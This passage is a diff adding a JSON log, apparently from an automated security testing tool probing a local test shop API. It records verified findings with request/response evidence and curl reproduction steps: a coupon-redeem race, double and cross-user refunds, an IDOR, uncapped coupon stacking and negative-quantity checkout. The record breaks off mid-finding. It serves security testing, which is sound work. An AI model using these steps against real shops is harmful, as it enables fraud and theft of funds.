@@ -1,0 +1,2451 @@
+[
+  {
+    "id": "F-017",
+    "kind": "CONTROL",
+    "source": "orchestrator",
+    "ts": 1793978599.797121,
+    "confidence": 1.0,
+    "tags": [],
+    "payload": {
+      "event": "engage",
+      "target": "http://127.0.0.1:8466"
+    },
+    "derived_from": []
+  },
+  {
+    "id": "SF-RECON-0047",
+    "kind": "OBSERVATION",
+    "source": "recon",
+    "ts": 1793978599.801734,
+    "confidence": 1.0,
+    "tags": [
+      "openapi"
+    ],
+    "payload": {
+      "openapi_paths": [
+        "/api/callbacks/{marker}",
+        "/api/cart",
+        "/api/cart/items",
+        "/api/catalog",
+        "/api/checkout/confirm",
+        "/api/checkout/init",
+        "/api/coupon/apply",
+        "/api/coupon/redeem",
+        "/api/ledger",
+        "/api/login",
+        "/api/orders/{order_id}",
+        "/api/orders/{order_id}/refund",
+        "/api/orders/{order_id}/ship",
+        "/api/refunds/async",
+        "/api/register",
+        "/api/wallet",
+        "/health"
+      ],
+      "openapi_doc": {
+        "/api/callbacks/{marker}": {
+          "get": {
+            "parameters": [
+              {
+                "in": "path",
+                "name": "marker",
+                "required": true,
+                "schema": {
+                  "type": "string"
+                }
+              }
+            ],
+            "responses": {
+              "200": {}
+            },
+            "x-kind": "callback"
+          }
+        },
+        "/api/cart": {
+          "get": {
+            "responses": {
+              "200": {}
+            },
+            "x-kind": "readback"
+          }
+        },
+        "/api/cart/items": {
+          "post": {
+            "requestBody": {
+              "application/json": {
+                "schema": {
+                  "properties": {
+                    "qty": {
+                      "minimum": 1,
+                      "type": "integer"
+                    },
+                    "sku": {
+                      "enum": [
+                        "SKU-GPU",
+                        "SKU-CABLE",
+                        "SKU-GIFTCARD"
+                      ],
+                      "type": "string"
+                    }
+                  },
+                  "required": [
+                    "sku"
+                  ],
+                  "type": "object"
+                }
+              }
+            },
+            "responses": {
+              "201": {}
+            },
+            "x-kind": "state-write"
+          }
+        },
+        "/api/catalog": {
+          "get": {
+            "responses": {
+              "200": {}
+            },
+            "x-kind": "meta"
+          }
+        },
+        "/api/checkout/confirm": {
+          "post": {
+            "requestBody": {
+              "application/json": {
+                "schema": {
+                  "properties": {
+                    "order_id": {
+                      "type": "string"
+                    }
+                  },
+                  "required": [
+                    "order_id"
+                  ],
+                  "type": "object"
+                }
+              }
+            },
+            "responses": {
+              "200": {}
+            },
+            "x-kind": "state-write"
+          }
+        },
+        "/api/checkout/init": {
+          "post": {
+            "responses": {
+              "201": {}
+            },
+            "x-kind": "state-write"
+          }
+        },
+        "/api/coupon/apply": {
+          "post": {
+            "requestBody": {
+              "application/json": {
+                "schema": {
+                  "properties": {
+                    "code": {
+                      "type": "string"
+                    }
+                  },
+                  "required": [
+                    "code"
+                  ],
+                  "type": "object"
+                }
+              }
+            },
+            "responses": {
+              "200": {}
+            },
+            "x-kind": "state-write"
+          }
+        },
+        "/api/coupon/redeem": {
+          "post": {
+            "requestBody": {
+              "application/json": {
+                "schema": {
+                  "properties": {
+                    "code": {
+                      "type": "string"
+                    }
+                  },
+                  "required": [
+                    "code"
+                  ],
+                  "type": "object"
+                }
+              }
+            },
+            "responses": {
+              "200": {}
+            },
+            "x-kind": "state-write"
+          }
+        },
+        "/api/ledger": {
+          "get": {
+            "responses": {
+              "200": {}
+            },
+            "x-kind": "readback"
+          }
+        },
+        "/api/login": {
+          "post": {
+            "requestBody": {
+              "application/json": {
+                "schema": {
+                  "properties": {
+                    "password": {
+                      "type": "string"
+                    },
+                    "username": {
+                      "type": "string"
+                    }
+                  },
+                  "required": [
+                    "username",
+                    "password"
+                  ],
+                  "type": "object"
+                }
+              }
+            },
+            "responses": {
+              "200": {}
+            },
+            "x-kind": "bootstrap"
+          }
+        },
+        "/api/orders/{order_id}": {
+          "get": {
+            "parameters": [
+              {
+                "in": "path",
+                "name": "order_id",
+                "required": true,
+                "schema": {
+                  "type": "string"
+                }
+              }
+            ],
+            "responses": {
+              "200": {}
+            },
+            "x-kind": "readback"
+          }
+        },
+        "/api/orders/{order_id}/refund": {
+          "post": {
+            "parameters": [
+              {
+                "in": "path",
+                "name": "order_id",
+                "required": true,
+                "schema": {
+                  "type": "string"
+                }
+              }
+            ],
+            "responses": {
+              "200": {}
+            },
+            "x-kind": "state-write"
+          }
+        },
+        "/api/orders/{order_id}/ship": {
+          "post": {
+            "parameters": [
+              {
+                "in": "path",
+                "name": "order_id",
+                "required": true,
+                "schema": {
+                  "type": "string"
+                }
+              }
+            ],
+            "responses": {
+              "200": {}
+            },
+            "x-kind": "state-write"
+          }
+        },
+        "/api/refunds/async": {
+          "post": {
+            "requestBody": {
+              "application/json": {
+                "schema": {
+                  "properties": {
+                    "order_id": {
+                      "type": "string"
+                    }
+                  },
+                  "required": [
+                    "order_id"
+                  ],
+                  "type": "object"
+                }
+              }
+            },
+            "responses": {
+              "202": {}
+            },
+            "x-kind": "state-write-async"
+          }
+        },
+        "/api/register": {
+          "post": {
+            "requestBody": {
+              "application/json": {
+                "schema": {
+                  "properties": {
+                    "password": {
+                      "type": "string"
+                    },
+                    "username": {
+                      "type": "string"
+                    }
+                  },
+                  "required": [
+                    "username"
+                  ],
+                  "type": "object"
+                }
+              }
+            },
+            "responses": {
+              "201": {}
+            },
+            "x-kind": "bootstrap"
+          }
+        },
+        "/api/wallet": {
+          "get": {
+            "responses": {
+              "200": {}
+            },
+            "x-kind": "readback"
+          }
+        },
+        "/health": {
+          "get": {
+            "responses": {
+              "200": {}
+            },
+            "x-kind": "meta"
+          }
+        }
+      },
+      "count": 17
+    },
+    "derived_from": [
+      "F-017"
+    ]
+  },
+  {
+    "id": "SF-RECON-0048",
+    "kind": "OBSERVATION",
+    "source": "recon",
+    "ts": 1793978599.806707,
+    "confidence": 1.0,
+    "tags": [
+      "fingerprint"
+    ],
+    "payload": {
+      "status": 200,
+      "server": "Werkzeug/3.1.9 Python/3.12.16"
+    },
+    "derived_from": [
+      "F-017"
+    ]
+  },
+  {
+    "id": "SF-SURFACE_MAPPER-0049",
+    "kind": "SURFACE",
+    "source": "surface_mapper",
+    "ts": 1793978599.818078,
+    "confidence": 1.0,
+    "tags": [
+      "surface"
+    ],
+    "payload": {
+      "path_count": 17,
+      "endpoints": [
+        "/api/callbacks/{marker}",
+        "/api/cart",
+        "/api/cart/items",
+        "/api/catalog",
+        "/api/checkout/confirm",
+        "/api/checkout/init",
+        "/api/coupon/apply",
+        "/api/coupon/redeem",
+        "/api/ledger",
+        "/api/login",
+        "/api/orders/{order_id}",
+        "/api/orders/{order_id}/refund",
+        "/api/orders/{order_id}/ship",
+        "/api/refunds/async",
+        "/api/register",
+        "/api/wallet",
+        "/health"
+      ],
+      "auth_model": "bearer-required",
+      "stateful_flows": [
+        "checkout/init -> checkout/confirm"
+      ],
+      "resource_actions": {
+        "callbacks": {
+          "create": null,
+          "actions": [
+            {
+              "verb": "read",
+              "path": "/api/callbacks/{marker}",
+              "method": "GET",
+              "schema": {},
+              "kind": "callback"
+            }
+          ],
+          "param": "/api/callbacks/{marker}",
+          "param_name": "marker"
+        },
+        "cart": {
+          "create": null,
+          "actions": [
+            {
+              "verb": "items",
+              "path": "/api/cart/items",
+              "method": "POST",
+              "schema": {
+                "qty": {
+                  "minimum": 1,
+                  "type": "integer"
+                },
+                "sku": {
+                  "enum": [
+                    "SKU-GPU",
+                    "SKU-CABLE",
+                    "SKU-GIFTCARD"
+                  ],
+                  "type": "string"
+                }
+              },
+              "kind": "state-write"
+            }
+          ],
+          "param": null,
+          "param_name": null
+        },
+        "catalog": {
+          "create": null,
+          "actions": [],
+          "param": null,
+          "param_name": null
+        },
+        "checkout": {
+          "create": null,
+          "actions": [
+            {
+              "verb": "confirm",
+              "path": "/api/checkout/confirm",
+              "method": "POST",
+              "schema": {
+                "order_id": {
+                  "type": "string"
+                }
+              },
+              "kind": "state-write"
+            },
+            {
+              "verb": "init",
+              "path": "/api/checkout/init",
+              "method": "POST",
+              "schema": {},
+              "kind": "state-write"
+            }
+          ],
+          "param": null,
+          "param_name": null
+        },
+        "coupon": {
+          "create": null,
+          "actions": [
+            {
+              "verb": "apply",
+              "path": "/api/coupon/apply",
+              "method": "POST",
+              "schema": {
+                "code": {
+                  "type": "string"
+                }
+              },
+              "kind": "state-write"
+            },
+            {
+              "verb": "redeem",
+              "path": "/api/coupon/redeem",
+              "method": "POST",
+              "schema": {
+                "code": {
+                  "type": "string"
+                }
+              },
+              "kind": "state-write"
+            }
+          ],
+          "param": null,
+          "param_name": null
+        },
+        "ledger": {
+          "create": null,
+          "actions": [],
+          "param": null,
+          "param_name": null
+        },
+        "login": {
+          "create": "/api/login",
+          "actions": [],
+          "param": null,
+          "param_name": null,
+          "create_schema": {
+            "password": {
+              "type": "string"
+            },
+            "username": {
+              "type": "string"
+            }
+          }
+        },
+        "orders": {
+          "create": null,
+          "actions": [
+            {
+              "verb": "read",
+              "path": "/api/orders/{order_id}",
+              "method": "GET",
+              "schema": {},
+              "kind": "readback"
+            },
+            {
+              "verb": "refund",
+              "path": "/api/orders/{order_id}/refund",
+              "method": "POST",
+              "schema": {},
+              "kind": "state-write"
+            },
+            {
+              "verb": "ship",
+              "path": "/api/orders/{order_id}/ship",
+              "method": "POST",
+              "schema": {},
+              "kind": "state-write"
+            }
+          ],
+          "param": "/api/orders/{order_id}",
+          "param_name": "order_id"
+        },
+        "refunds": {
+          "create": null,
+          "actions": [
+            {
+              "verb": "async",
+              "path": "/api/refunds/async",
+              "method": "POST",
+              "schema": {
+                "order_id": {
+                  "type": "string"
+                }
+              },
+              "kind": "state-write-async"
+            }
+          ],
+          "param": null,
+          "param_name": null
+        },
+        "register": {
+          "create": "/api/register",
+          "actions": [],
+          "param": null,
+          "param_name": null,
+          "create_schema": {
+            "password": {
+              "type": "string"
+            },
+            "username": {
+              "type": "string"
+            }
+          }
+        },
+        "wallet": {
+          "create": null,
+          "actions": [],
+          "param": null,
+          "param_name": null
+        }
+      },
+      "param_objects": [
+        "/api/orders/{order_id}",
+        "/api/orders/{order_id}/refund",
+        "/api/orders/{order_id}/ship"
+      ],
+      "coupon": [
+        "/api/coupon/apply"
+      ],
+      "refund": [
+        "/api/orders/{order_id}/refund"
+      ],
+      "redeem": [
+        "/api/coupon/redeem"
+      ],
+      "async": [
+        "/api/refunds/async"
+      ],
+      "state_writes": [
+        "/api/checkout/confirm",
+        "/api/checkout/init"
+      ],
+      "readback": [
+        "/api/callbacks/{marker}",
+        "/api/cart",
+        "/api/cart/items",
+        "/api/ledger",
+        "/api/orders/{order_id}",
+        "/api/orders/{order_id}/refund",
+        "/api/orders/{order_id}/ship",
+        "/api/wallet"
+      ],
+      "other": []
+    },
+    "derived_from": [
+      "SF-RECON-0047"
+    ]
+  },
+  {
+    "id": "SF-SURFACE_MAPPER-0050",
+    "kind": "OBSERVATION",
+    "source": "surface_mapper",
+    "ts": 1793978599.818084,
+    "confidence": 1.0,
+    "tags": [
+      "auth-boundary"
+    ],
+    "payload": {
+      "auth_model": "bearer-required",
+      "evidence": "anon GET /api/wallet -> 401"
+    },
+    "derived_from": [
+      "SF-RECON-0047"
+    ]
+  },
+  {
+    "id": "SF-HYPOTHESIS-0051",
+    "kind": "HYPOTHESIS",
+    "source": "hypothesis",
+    "ts": 1793978599.8181949,
+    "confidence": 0.5,
+    "tags": [
+      "h_race"
+    ],
+    "payload": {
+      "tag": "h_race",
+      "title": "Single-use redemption may lose check-then-act races",
+      "prior": 0.5,
+      "test_plan": "last-byte-synchronised race, 8 workers",
+      "origin": "rules",
+      "status": "open"
+    },
+    "derived_from": [
+      "SF-SURFACE_MAPPER-0049"
+    ]
+  },
+  {
+    "id": "SF-HYPOTHESIS-0052",
+    "kind": "HYPOTHESIS",
+    "source": "hypothesis",
+    "ts": 1793978599.818198,
+    "confidence": 0.55,
+    "tags": [
+      "h_async"
+    ],
+    "payload": {
+      "tag": "h_async",
+      "title": "Async refund leg may double-credit within the callback window",
+      "prior": 0.55,
+      "test_plan": "async refund + sync refund, poll callback",
+      "origin": "rules",
+      "status": "open"
+    },
+    "derived_from": [
+      "SF-SURFACE_MAPPER-0049"
+    ]
+  },
+  {
+    "id": "SF-HYPOTHESIS-0053",
+    "kind": "HYPOTHESIS",
+    "source": "hypothesis",
+    "ts": 1793978599.8182003,
+    "confidence": 0.6,
+    "tags": [
+      "h_idor"
+    ],
+    "payload": {
+      "tag": "h_idor",
+      "title": "Parameterised object endpoints may lack ownership checks",
+      "prior": 0.6,
+      "test_plan": "cross-user read of a fresh order",
+      "origin": "rules",
+      "status": "open"
+    },
+    "derived_from": [
+      "SF-SURFACE_MAPPER-0049"
+    ]
+  },
+  {
+    "id": "SF-HYPOTHESIS-0054",
+    "kind": "HYPOTHESIS",
+    "source": "hypothesis",
+    "ts": 1793978599.8182027,
+    "confidence": 0.6,
+    "tags": [
+      "h_refund"
+    ],
+    "payload": {
+      "tag": "h_refund",
+      "title": "Refund transitions may be replayable and mis-credited",
+      "prior": 0.6,
+      "test_plan": "replay refund x2 as a second principal",
+      "origin": "rules",
+      "status": "open"
+    },
+    "derived_from": [
+      "SF-SURFACE_MAPPER-0049"
+    ]
+  },
+  {
+    "id": "SF-HYPOTHESIS-0055",
+    "kind": "HYPOTHESIS",
+    "source": "hypothesis",
+    "ts": 1793978599.8182049,
+    "confidence": 0.5,
+    "tags": [
+      "h_coupon"
+    ],
+    "payload": {
+      "tag": "h_coupon",
+      "title": "Multi-use coupon application may stack without cap",
+      "prior": 0.5,
+      "test_plan": "replay coupon/apply x12",
+      "origin": "rules",
+      "status": "open"
+    },
+    "derived_from": [
+      "SF-SURFACE_MAPPER-0049"
+    ]
+  },
+  {
+    "id": "SF-HYPOTHESIS-0056",
+    "kind": "HYPOTHESIS",
+    "source": "hypothesis",
+    "ts": 1793978599.818207,
+    "confidence": 0.7,
+    "tags": [
+      "h_fsm"
+    ],
+    "payload": {
+      "tag": "h_fsm",
+      "title": "Order lifecycle is a two-step state machine; transition guards may be missing",
+      "prior": 0.7,
+      "test_plan": "spawn statefuzz specialist",
+      "origin": "rules",
+      "status": "open"
+    },
+    "derived_from": [
+      "SF-SURFACE_MAPPER-0049"
+    ]
+  },
+  {
+    "id": "SF-HYPOTHESIS-0057",
+    "kind": "HYPOTHESIS",
+    "source": "hypothesis",
+    "ts": 1793978599.8182096,
+    "confidence": 0.5,
+    "tags": [
+      "h_mass_assign"
+    ],
+    "payload": {
+      "tag": "h_mass_assign",
+      "title": "Undocumented body fields may override pricing or entitlements",
+      "prior": 0.5,
+      "test_plan": "differential create with injected candidates",
+      "origin": "generic-rules",
+      "status": "open"
+    },
+    "derived_from": [
+      "SF-SURFACE_MAPPER-0049"
+    ]
+  },
+  {
+    "id": "SF-HYPOTHESIS-0058",
+    "kind": "HYPOTHESIS",
+    "source": "hypothesis",
+    "ts": 1793978599.8182118,
+    "confidence": 0.45,
+    "tags": [
+      "h_arith_cycle"
+    ],
+    "payload": {
+      "tag": "h_arith_cycle",
+      "title": "Value-neutral cycles of a priced transition may accumulate rounding drift",
+      "prior": 0.45,
+      "test_plan": "cycle 12x, net wallet delta",
+      "origin": "generic-rules",
+      "status": "open"
+    },
+    "derived_from": [
+      "SF-SURFACE_MAPPER-0049"
+    ]
+  },
+  {
+    "id": "SF-HYPOTHESIS-0059",
+    "kind": "HYPOTHESIS",
+    "source": "hypothesis",
+    "ts": 1793978599.8182147,
+    "confidence": 0.5,
+    "tags": [
+      "h_quota_race"
+    ],
+    "payload": {
+      "tag": "h_quota_race",
+      "title": "Quota-limited claims may lose the check-then-act race to distinct principals",
+      "prior": 0.5,
+      "test_plan": "multi-principal last-byte race",
+      "origin": "generic-rules",
+      "status": "open"
+    },
+    "derived_from": [
+      "SF-SURFACE_MAPPER-0049"
+    ]
+  },
+  {
+    "id": "SF-EXPLOIT-0060",
+    "kind": "FINDING",
+    "source": "exploit",
+    "ts": 1793978599.8680098,
+    "confidence": 1.0,
+    "tags": [
+      "h_race",
+      "I5"
+    ],
+    "payload": {
+      "finding": {
+        "id": "SW-RACE",
+        "title": "Single-use redeem loses check-then-act race",
+        "severity": "high",
+        "invariant": "I5",
+        "operators": [
+          "INTERRUPT"
+        ],
+        "endpoint": "POST /api/coupon/redeem",
+        "evidence": [
+          {
+            "responses": [
+              {
+                "status": 200,
+                "resp_body": {
+                  "credited_cents": 50000
+                }
+              },
+              {
+                "status": 200,
+                "resp_body": {
+                  "credited_cents": 50000
+                }
+              },
+              {
+                "status": 200,
+                "resp_body": {
+                  "credited_cents": 50000
+                }
+              },
+              {
+                "status": 200,
+                "resp_body": {
+                  "credited_cents": 50000
+                }
+              },
+              {
+                "status": 200,
+                "resp_body": {
+                  "credited_cents": 50000
+                }
+              },
+              {
+                "status": 200,
+                "resp_body": {
+                  "credited_cents": 50000
+                }
+              },
+              {
+                "status": 200,
+                "resp_body": {
+                  "credited_cents": 50000
+                }
+              },
+              {
+                "status": 200,
+                "resp_body": {
+                  "credited_cents": 50000
+                }
+              }
+            ],
+            "wallet_delta": 400000,
+            "violation": {
+              "invariant": "I5",
+              "assertion": "credited_total == value",
+              "observed": {
+                "value_cents": 50000,
+                "credited_total": 400000,
+                "successful_redeems": 8
+              },
+              "detail": "single-use coupon credited 400000 cents across a 8-request synchronized race (face value 50000)"
+            }
+          }
+        ],
+        "reproduction": [],
+        "preconditions": [
+          "any account",
+          "unredeemed single-use coupon"
+        ],
+        "grants": [
+          "multiply coupon value by race winners"
+        ],
+        "chain_ids": [],
+        "confidence": "high"
+      },
+      "status": "verified-by-transcript",
+      "technique": "h_race",
+      "verification": {
+        "by": "verify",
+        "method": "race artifact consumed; transcript evidence stands (curation weight 0.5)",
+        "independent_principals": []
+      }
+    },
+    "derived_from": [
+      "SF-HYPOTHESIS-0051"
+    ]
+  },
+  {
+    "id": "SF-VERIFY-0061",
+    "kind": "CONTROL",
+    "source": "verify",
+    "ts": 1793978599.8680797,
+    "confidence": 1.0,
+    "tags": [],
+    "payload": {
+      "event": "finding_verified",
+      "finding_id": "SW-RACE",
+      "status": "verified-by-transcript",
+      "technique": "h_race"
+    },
+    "derived_from": [
+      "SF-EXPLOIT-0060"
+    ]
+  },
+  {
+    "id": "SF-EXPLOIT-0062",
+    "kind": "FINDING",
+    "source": "exploit",
+    "ts": 1793978600.9880767,
+    "confidence": 1.0,
+    "tags": [
+      "h_async",
+      "I1"
+    ],
+    "payload": {
+      "finding": {
+        "id": "SW-ASYNC",
+        "title": "Async + sync refund double-credit in the deferred window",
+        "severity": "critical",
+        "invariant": "I1",
+        "operators": [
+          "INTERRUPT",
+          "REPLAY"
+        ],
+        "endpoint": "POST /api/refunds/async",
+        "evidence": [
+          {
+            "wallet_before": 870100,
+            "wallet_after": 1129900,
+            "order_total": 129900,
+            "callback": {
+              "marker": "d12c884f9394",
+              "refund_cents": 129900,
+              "status": "done"
+            },
+            "violation": {
+              "invariant": "I1",
+              "detail": "deferred window credited 259800 for a single 129900-cent refund"
+            }
+          }
+        ],
+        "reproduction": [],
+        "preconditions": [
+          "any account",
+          "own paid order"
+        ],
+        "grants": [
+          "2x credit per refund across async/sync seam"
+        ],
+        "chain_ids": [],
+        "confidence": "high"
+      },
+      "status": "verified",
+      "technique": "h_async",
+      "verification": {
+        "by": "verify",
+        "method": "double refund credited twice",
+        "independent_principals": [
+          "verify-301902-0"
+        ]
+      }
+    },
+    "derived_from": [
+      "SF-HYPOTHESIS-0052"
+    ]
+  },
+  {
+    "id": "SF-VERIFY-0063",
+    "kind": "CONTROL",
+    "source": "verify",
+    "ts": 1793978601.003375,
+    "confidence": 1.0,
+    "tags": [],
+    "payload": {
+      "event": "finding_verified",
+      "finding_id": "SW-ASYNC",
+      "status": "verified",
+      "technique": "h_async"
+    },
+    "derived_from": [
+      "SF-EXPLOIT-0062"
+    ]
+  },
+  {
+    "id": "SF-EXPLOIT-0064",
+    "kind": "FINDING",
+    "source": "exploit",
+    "ts": 1793978601.015266,
+    "confidence": 1.0,
+    "tags": [
+      "h_idor",
+      "I3"
+    ],
+    "payload": {
+      "finding": {
+        "id": "SW-IDOR",
+        "title": "Any user can read any order (IDOR)",
+        "severity": "high",
+        "invariant": "I3",
+        "operators": [
+          "CROSS-USER"
+        ],
+        "endpoint": "GET /api/orders/{id}",
+        "evidence": [
+          {
+            "method": "GET",
+            "path": "/api/orders/ORD-d54f990c",
+            "principal": "atk-301902-3",
+            "status": 200,
+            "owner": "own-301902-2",
+            "violation": {
+              "invariant": "I3",
+              "assertion": "caller == object.owner",
+              "observed": {
+                "caller": "atk-301902-3",
+                "owner": "own-301902-2"
+              },
+              "detail": "atk-301902-3 accessed order owned by own-301902-2"
+            }
+          }
+        ],
+        "reproduction": [],
+        "preconditions": [
+          "any account",
+          "valid order_id"
+        ],
+        "grants": [
+          "read any order"
+        ],
+        "chain_ids": [],
+        "confidence": "high"
+      },
+      "status": "verified",
+      "technique": "h_idor",
+      "verification": {
+        "by": "verify",
+        "method": "fresh cross-user read succeeded",
+        "independent_principals": [
+          "verify-301902-1",
+          "verify-301902-2"
+        ]
+      }
+    },
+    "derived_from": [
+      "SF-HYPOTHESIS-0053"
+    ]
+  },
+  {
+    "id": "SF-VERIFY-0065",
+    "kind": "CONTROL",
+    "source": "verify",
+    "ts": 1793978601.028196,
+    "confidence": 1.0,
+    "tags": [],
+    "payload": {
+      "event": "finding_verified",
+      "finding_id": "SW-IDOR",
+      "status": "verified",
+      "technique": "h_idor"
+    },
+    "derived_from": [
+      "SF-EXPLOIT-0064"
+    ]
+  },
+  {
+    "id": "SF-EXPLOIT-0066",
+    "kind": "FINDING",
+    "source": "exploit",
+    "ts": 1793978601.045446,
+    "confidence": 1.0,
+    "tags": [
+      "h_refund",
+      "I3"
+    ],
+    "payload": {
+      "finding": {
+        "id": "SW-REF-X",
+        "title": "Refund credits the CALLER, not the owner",
+        "severity": "critical",
+        "invariant": "I3",
+        "operators": [
+          "CROSS-USER"
+        ],
+        "endpoint": "POST /api/orders/{id}/refund",
+        "evidence": [
+          {
+            "wallet_delta": 259800,
+            "owner": "rowner-301902-4",
+            "caller": "ratk-301902-5"
+          }
+        ],
+        "reproduction": [],
+        "preconditions": [
+          "any account",
+          "order_id of any paid order"
+        ],
+        "grants": [
+          "withdraw any user's order value to own wallet"
+        ],
+        "chain_ids": [],
+        "confidence": "high"
+      },
+      "status": "verified",
+      "technique": "h_refund",
+      "verification": {
+        "by": "verify",
+        "method": "fresh cross-user refund credited caller",
+        "independent_principals": [
+          "verify-301902-3",
+          "verify-301902-4"
+        ]
+      }
+    },
+    "derived_from": [
+      "SF-HYPOTHESIS-0054"
+    ]
+  },
+  {
+    "id": "SF-EXPLOIT-0067",
+    "kind": "FINDING",
+    "source": "exploit",
+    "ts": 1793978601.0454602,
+    "confidence": 1.0,
+    "tags": [
+      "h_refund",
+      "I1"
+    ],
+    "payload": {
+      "finding": {
+        "id": "SW-REF-R",
+        "title": "Refund is replayable",
+        "severity": "critical",
+        "invariant": "I1",
+        "operators": [
+          "REPLAY"
+        ],
+        "endpoint": "POST /api/orders/{id}/refund",
+        "evidence": [
+          {
+            "credits": [
+              129900,
+              129900
+            ],
+            "violation": {
+              "invariant": "I1",
+              "assertion": "sum(credits) <= order_total",
+              "observed": {
+                "order_total": 129900,
+                "credits": [
+                  129900,
+                  129900
+                ],
+                "overcredit": 129900
+              },
+              "detail": "refunded ratk-301902-5 over price by 129900 cents"
+            }
+          }
+        ],
+        "reproduction": [],
+        "preconditions": [
+          "any account",
+          "any paid order"
+        ],
+        "grants": [
+          "multiply balance by refund count"
+        ],
+        "chain_ids": [],
+        "confidence": "high"
+      },
+      "status": "verified",
+      "technique": "h_refund",
+      "verification": {
+        "by": "verify",
+        "method": "double refund credited twice",
+        "independent_principals": [
+          "verify-301902-4",
+          "verify-301902-5"
+        ]
+      }
+    },
+    "derived_from": [
+      "SF-HYPOTHESIS-0054"
+    ]
+  },
+  {
+    "id": "SF-VERIFY-0068",
+    "kind": "CONTROL",
+    "source": "verify",
+    "ts": 1793978601.0611527,
+    "confidence": 1.0,
+    "tags": [],
+    "payload": {
+      "event": "finding_verified",
+      "finding_id": "SW-REF-X",
+      "status": "verified",
+      "technique": "h_refund"
+    },
+    "derived_from": [
+      "SF-EXPLOIT-0066"
+    ]
+  },
+  {
+    "id": "SF-VERIFY-0069",
+    "kind": "CONTROL",
+    "source": "verify",
+    "ts": 1793978601.0749836,
+    "confidence": 1.0,
+    "tags": [],
+    "payload": {
+      "event": "finding_verified",
+      "finding_id": "SW-REF-R",
+      "status": "verified",
+      "technique": "h_refund"
+    },
+    "derived_from": [
+      "SF-EXPLOIT-0067"
+    ]
+  },
+  {
+    "id": "SF-EXPLOIT-0070",
+    "kind": "FINDING",
+    "source": "exploit",
+    "ts": 1793978601.1002674,
+    "confidence": 1.0,
+    "tags": [
+      "h_coupon",
+      "I1"
+    ],
+    "payload": {
+      "finding": {
+        "id": "SW-STACK",
+        "title": "Coupon stacks without cap",
+        "severity": "high",
+        "invariant": "I1",
+        "operators": [
+          "REPLAY"
+        ],
+        "endpoint": "POST /api/coupon/apply",
+        "evidence": [
+          {
+            "cart_after": {
+              "discount_pct": 120,
+              "items": {
+                "SKU-GPU": 1
+              },
+              "subtotal_cents": 129900,
+              "total_cents": -25980,
+              "user": "cpn-301902-6"
+            },
+            "violation": {
+              "invariant": "I4",
+              "assertion": "discount_pct <= 100",
+              "observed": {
+                "discount_pct": 120,
+                "total_cents": -25980
+              },
+              "detail": "stacked discount 120% drives total to -25980"
+            }
+          }
+        ],
+        "reproduction": [],
+        "preconditions": [
+          "any account"
+        ],
+        "grants": [
+          "drive total to 0 or negative"
+        ],
+        "chain_ids": [],
+        "confidence": "high"
+      },
+      "status": "verified",
+      "technique": "h_coupon",
+      "verification": {
+        "by": "verify",
+        "method": "stacked discount exceeded subtotal",
+        "independent_principals": [
+          "verify-301902-5",
+          "verify-301902-6"
+        ]
+      }
+    },
+    "derived_from": [
+      "SF-HYPOTHESIS-0055"
+    ]
+  },
+  {
+    "id": "SF-VERIFY-0071",
+    "kind": "CONTROL",
+    "source": "verify",
+    "ts": 1793978601.124694,
+    "confidence": 1.0,
+    "tags": [],
+    "payload": {
+      "event": "finding_verified",
+      "finding_id": "SW-STACK",
+      "status": "verified",
+      "technique": "h_coupon"
+    },
+    "derived_from": [
+      "SF-EXPLOIT-0070"
+    ]
+  },
+  {
+    "id": "SF-EXPLOIT-STATEF-0072",
+    "kind": "FINDING",
+    "source": "exploit/statefuzz_spec",
+    "ts": 1793978602.0693367,
+    "confidence": 0.9,
+    "tags": [
+      "h_fsm",
+      "I4"
+    ],
+    "payload": {
+      "finding": {
+        "id": "SF-NEG-QTY",
+        "title": "Negative-quantity checkout credits the attacker wallet",
+        "severity": "high",
+        "invariant": "I4",
+        "operators": [
+          "NEGATIVE"
+        ],
+        "endpoint": "POST /api/cart/items",
+        "preconditions": [
+          "any account"
+        ],
+        "grants": [
+          "credit self-balance without payment"
+        ],
+        "evidence": [
+          {
+            "method": "POST",
+            "path": "/api/cart/items",
+            "req_body": {
+              "sku": "SKU-CABLE",
+              "qty": -3
+            },
+            "status": 201,
+            "resp_body": {
+              "cart": {
+                "discount_pct": 0,
+                "items": {
+                  "SKU-CABLE": -3
+                }
+              }
+            }
+          },
+          {
+            "method": "POST",
+            "path": "/api/checkout/init",
+            "req_body": null,
+            "status": 201,
+            "resp_body": {
+              "order_id": "ORD-4239773c",
+              "status": "initiated",
+              "total_cents": -2700
+            }
+          },
+          {
+            "method": "POST",
+            "path": "/api/checkout/confirm",
+            "req_body": {
+              "order_id": "ORD-4239773c"
+            },
+            "status": 200,
+            "resp_body": {
+              "charged_cents": -2700,
+              "order_id": "ORD-4239773c",
+              "status": "paid"
+            }
+          },
+          {
+            "wallet_before": 1000000,
+            "wallet_after": 1002700,
+            "order_total_cents": -2700,
+            "violation": {
+              "invariant": "I4",
+              "assertion": "order_total >= 0",
+              "observed": {
+                "order_total": -2700,
+                "wallet_delta": 2700
+              },
+              "detail": "checkout charged -2700 cents (negative) and wallet went UP by 2700"
+            }
+          }
+        ],
+        "reproduction": [
+          "curl -X POST $B/api/cart/items -d '{\"sku\":\"SKU-CABLE\",\"qty\":-3}'",
+          "curl -X POST $B/api/checkout/init",
+          "curl -X POST $B/api/checkout/confirm -d '{\"order_id\":...}'"
+        ],
+        "confidence": "high",
+        "status": "candidate",
+        "chain_ids": []
+      },
+      "status": "verified",
+      "technique": "h_fsm",
+      "tool": "statefuzz",
+      "verification": {
+        "by": "verify",
+        "method": "negative-qty checkout credited wallet",
+        "independent_principals": [
+          "verify-301902-6",
+          "verify-301902-7"
+        ]
+      }
+    },
+    "derived_from": [
+      "SF-HYPOTHESIS-0056"
+    ]
+  },
+  {
+    "id": "SF-EXPLOIT-STATEF-0073",
+    "kind": "FINDING",
+    "source": "exploit/statefuzz_spec",
+    "ts": 1793978602.0693438,
+    "confidence": 0.9,
+    "tags": [
+      "h_fsm",
+      "I1"
+    ],
+    "payload": {
+      "finding": {
+        "id": "SF-STACK-DISC",
+        "title": "Coupon stacks without cap: discount exceeds subtotal",
+        "severity": "high",
+        "invariant": "I1",
+        "operators": [
+          "REPLAY"
+        ],
+        "endpoint": "POST /api/coupon/apply",
+        "preconditions": [
+          "any account"
+        ],
+        "grants": [
+          "drive order total to 0 or negative"
+        ],
+        "evidence": [
+          {
+            "method": "POST",
+            "path": "/api/coupon/apply",
+            "req_body": {
+              "code": "WELCOME10"
+            },
+            "status": 200,
+            "resp_body": {
+              "discount_pct": 10
+            }
+          },
+          {
+            "method": "POST",
+            "path": "/api/coupon/apply",
+            "req_body": {
+              "code": "WELCOME10"
+            },
+            "status": 200,
+            "resp_body": {
+              "discount_pct": 20
